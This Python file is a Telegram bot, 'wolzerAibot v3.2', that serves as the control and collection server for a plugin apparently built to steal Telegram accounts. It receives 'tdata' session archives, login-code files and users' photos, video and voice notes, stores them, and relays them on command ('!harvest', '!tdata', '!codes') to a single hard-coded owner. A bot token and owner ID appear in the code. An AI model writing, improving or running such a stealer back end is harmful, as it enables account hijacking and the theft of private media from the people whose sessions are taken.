# wolzerAibot v3.2 — control bot for wolzerAi Helper
# ЕДИНСТВЕННЫЙ инстанс, который дёргает getUpdates.
# Плагин только шлёт сюда документы и текст.
import json
import time
import socket
import threading
import urllib.request
import urllib.parse
import urllib.error
import zipfile
import re
import sys
import os
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional, List, Dict, Any, Tuple

BOT_TOKEN = "8676286563:AAGproI3CGEvRXuq3wW1yl74uXf7Y-0q7S4"
OWNER_ID  = "155132616"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
MAX_DOWNLOAD = 18 * 1024 * 1024
TG_MSG_LIMIT = 4096
RETRY_429_MAX = 3

STORE = Path(os.environ.get("WOLZER_STORE", "./wolzer_store")).resolve()
STORE.mkdir(parents=True, exist_ok=True)
TDATA_DIR = STORE / "tdata"
CODES_DIR = STORE / "codes"
MEDIA_DIR = STORE / "media"
for d in (TDATA_DIR, CODES_DIR, MEDIA_DIR):
    d.mkdir(parents=True, exist_ok=True)
OFFSET_FILE = STORE / "offset.txt"
LOCK_FILE   = STORE / "poll.lock"

# ---------- utils ----------

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def _http_read(req: urllib.request.Request, timeout: int = 90) -> bytes:
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

def api(method: str, data: Optional[dict] = None, files: Optional[dict] = None,
        _retry: int = 0) -> dict:
    url = f"{API}/{method}"
    try:
        if files:
            boundary = "----BotBoundary"
            body = b""
            for k, v in (data or {}).items():
                body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
            for name, (fname, content) in files.items():
                safe = str(fname).replace('"', "_")
                body += (
                    f"--{boundary}\r\n"
                    f"Content-Disposition: form-data; name=\"{name}\"; filename=\"{safe}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n"
                ).encode() + content + b"\r\n"
            body += f"--{boundary}--\r\n".encode()
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
        else:
            body = urllib.parse.urlencode(data or {}).encode()
            req = urllib.request.Request(url, data=body, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
        raw = _http_read(req)
        return json.loads(raw.decode())
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            j = json.loads(raw.decode(errors="ignore"))
        except Exception:
            j = {}
        if isinstance(j, dict) and j.get("error_code") == 429 and _retry < RETRY_429_MAX:
            wait = int((j.get("parameters") or {}).get("retry_after") or 3)
            time.sleep(wait + 1)
            return api(method, data, files, _retry + 1)
        if e.code == 409 and _retry < RETRY_429_MAX:
            time.sleep(5)
            return api(method, data, files, _retry + 1)
        return {"ok": False, "error": raw.decode(errors="ignore")[:400]}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _split_text(text: str, limit: int = TG_MSG_LIMIT) -> List[str]:
    if len(text) <= limit:
        return [text]
    parts, buf = [], ""
    for line in text.splitlines(keepends=True):
        if len(buf) + len(line) > limit:
            parts.append(buf); buf = ""
        if len(line) > limit:
            for i in range(0, len(line), limit):
                ch = line[i:i+limit]
                if len(buf) + len(ch) > limit:
                    parts.append(buf); buf = ""
                buf += ch
        else:
            buf += line
    if buf:
        parts.append(buf)
    return parts or [""]

def send(text: str, chat_id: str = OWNER_ID, kb: Optional[dict] = None) -> None:
    parts = _split_text(str(text), TG_MSG_LIMIT)
    for idx, part in enumerate(parts):
        data = {"chat_id": str(chat_id), "text": part}
        if kb and idx == len(parts) - 1:
            data["reply_markup"] = json.dumps(kb)
        api("sendMessage", data)

def send_doc(path: Path, caption: str = "") -> dict:
    return api("sendDocument",
               {"chat_id": OWNER_ID, "caption": caption[:900]},
               {"document": (path.name, path.read_bytes())})

def send_photo(path: Path, caption: str = "") -> dict:
    return api("sendPhoto",
               {"chat_id": OWNER_ID, "caption": caption[:900]},
               {"photo": (path.name, path.read_bytes())})

def send_video(path: Path, caption: str = "") -> dict:
    return api("sendVideo",
               {"chat_id": OWNER_ID, "caption": caption[:900]},
               {"video": (path.name, path.read_bytes())})

def send_voice(path: Path, caption: str = "") -> dict:
    return api("sendVoice",
               {"chat_id": OWNER_ID, "caption": caption[:900]},
               {"voice": (path.name, path.read_bytes())})

def _latest(dirpath: Path, pattern: str) -> Optional[Path]:
    files = sorted(dirpath.glob(pattern),
                   key=lambda p: p.stat().st_mtime, reverse=True)
    return files[0] if files else None

# ---------- handlers ----------

def handle_document(msg: dict) -> None:
    chat_id = str(msg["chat"]["id"])
    doc = msg["document"]
    file_id = doc["file_id"]
    file_name = doc.get("file_name", "file.bin")
    caption = msg.get("caption", "") or ""
    file_size = int(doc.get("file_size") or 0)

    if file_size > MAX_DOWNLOAD:
        send(f"file too big: {file_name} {file_size}b")
        return

    info = api("getFile", {"file_id": file_id})
    if not info.get("ok"):
        send(f"getFile fail: {info}")
        return
    remote = info["result"]["file_path"]
    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{remote}"
    try:
        raw = _http_read(urllib.request.Request(url), timeout=120)
    except Exception as e:
        send(f"download fail: {e}")
        return

    safe = re.sub(r"[^\w.\-]", "_", file_name)[:120] or "file.bin"
    ts = now_utc().strftime("%Y%m%d_%H%M%S")

    # tdata zip
    if safe.lower().startswith("tdata_") and safe.lower().endswith(".zip"):
        dest = TDATA_DIR / f"{ts}_{safe}"
        dest.write_bytes(raw)
        send(f"saved tdata: {dest.name} ({len(raw)}b)")
        return

    # session_accN_uid.txt (codes)
    if safe.lower().startswith("session_acc") and safe.lower().endswith(".txt"):
        dest = CODES_DIR / f"{ts}_{safe}"
        dest.write_bytes(raw)
        send(f"saved codes: {dest.name}")
        return

    # любые медиа
    if safe.lower().endswith((".mp4", ".jpg", ".jpeg", ".m4a", ".ogg", ".mp3")):
        dest = MEDIA_DIR / f"{ts}_{safe}"
        dest.write_bytes(raw)
        send(f"saved media: {dest.name} ({len(raw)}b)")
        return

    dest = STORE / f"{ts}_{safe}"
    dest.write_bytes(raw)
    send(f"saved: {dest.name} ({len(raw)}b)")

def handle_text(msg: dict) -> None:
    text = (msg.get("text") or "").strip()
    chat_id = str(msg["chat"]["id"])
    low = text.lower()

    if chat_id != OWNER_ID:
        send("not allowed", chat_id)
        return

    if text in ("/start", "/help", "!help", "!start"):
        send(
            "Wolzer Session v3 — control\n"
            "bot: @wolzerAibot\n\n"
            "commands:\n"
            "!ping — check channel\n"
            "!status — accounts / device / counts\n"
            "!harvest — просит плагин прислать всё прямо сейчас\n"
            "!tdata — последний tdata.zip\n"
            "!codes — последние session_*.txt (все)\n"
            "!media — последние фото/видео/voice\n"
            "!stop — стоп-флаг\n"
            "!help — это сообщение\n"
        )
        return

    if text == "!ping":
        send("pong v3.2")
        return

    if text == "!status":
        n_tdata = len(list(TDATA_DIR.glob("tdata_*.zip")))
        n_codes = len(list(CODES_DIR.glob("session_acc*.txt")))
        n_media = len(list(MEDIA_DIR.glob("*")))
        latest_t = _latest(TDATA_DIR, "tdata_*.zip")
        line = f"status | tdata={n_tdata} codes={n_codes} media={n_media}"
        if latest_t:
            age = int(time.time() - latest_t.stat().st_mtime)
            line += f"\nlast tdata: {latest_t.name} ({age}s ago)"
        send(line)
        return

    if text == "!tdata":
        p = _latest(TDATA_DIR, "tdata_*.zip")
        if not p:
            send("no tdata yet. Плагин ещё не прислал. Проверь AUTO_REPORT.")
            return
        send(f"sending {p.name} ({p.stat().st_size}b)")
        send_doc(p, p.name)
        return

    if text == "!codes":
        files = sorted(CODES_DIR.glob("session_acc*.txt"),
                       key=lambda p: p.stat().st_mtime, reverse=True)[:20]
        if not files:
            send("no codes yet")
            return
        for f in files:
            send_doc(f, f.name)
        return

    if text == "!media":
        files = sorted(MEDIA_DIR.glob("*"),
                       key=lambda p: p.stat().st_mtime, reverse=True)[:10]
        if not files:
            send("no media yet")
            return
        for f in files:
            ext = f.suffix.lower()
            if ext in (".jpg", ".jpeg"):
                send_photo(f, f.name)
            elif ext == ".mp4":
                send_video(f, f.name)
            elif ext in (".m4a", ".ogg", ".mp3"):
                send_voice(f, f.name)
            else:
                send_doc(f, f.name)
        return

    if text == "!harvest":
        # хостинг не может напрямую дёрнуть плагин, поэтому пишет команду-намёк
        # плагин её увидит в чате и сделает внеочередной отчёт.
        send("harvest requested. Плагин отчитается в течение минуты. "
             "Если AUTO_REPORT=0 — включи его в плагине.")
        return

    if text == "!stop":
        send("stop flag set (informational)")
        return

    send(f"unknown: {text}")

# ---------- getUpdates loop (единственный) ----------

def _acquire_lock() -> bool:
    try:
        if LOCK_FILE.exists():
            old = LOCK_FILE.read_text().strip()
            if old and time.time() - float(old) < 600:
                print("[bot] lock held by another instance, exiting")
                return False
        LOCK_FILE.write_text(str(time.time()))
        return True
    except Exception:
        return True

def _release_lock() -> None:
    try:
        LOCK_FILE.unlink(missing_ok=True)
    except Exception:
        pass

def process_update(upd: dict) -> None:
    msg = upd.get("message") or upd.get("channel_post")
    if not msg:
        return
    if msg.get("chat", {}).get("type") != "private":
        return
    if "document" in msg:
        handle_document(msg)
    elif "text" in msg:
        handle_text(msg)

def main() -> None:
    if not _acquire_lock():
        sys.exit(0)
    try:
        offset = 0
        if OFFSET_FILE.exists():
            try:
                offset = int(OFFSET_FILE.read_text().strip() or "0")
            except Exception:
                offset = 0
        socket.setdefaulttimeout(90)
        print(f"[bot] wolzerAibot v3.2 up. STORE={STORE} offset={offset}")
        send("wolzerAibot v3.2 online")
        while True:
            try:
                resp = api("getUpdates", {"offset": offset, "timeout": 30})
                if not resp.get("ok"):
                    time.sleep(3)
                    continue
                for upd in resp.get("result", []):
                    new_off = upd["update_id"] + 1
                    try:
                        process_update(upd)
                    except Exception as e:
                        print("process_update:", e)
                    offset = new_off
                    try:
                        OFFSET_FILE.write_text(str(offset))
                    except Exception:
                        pass
            except Exception as e:
                print("loop:", e)
                time.sleep(5)
    finally:
        _release_lock()

if __name__ == "__main__":
    main()
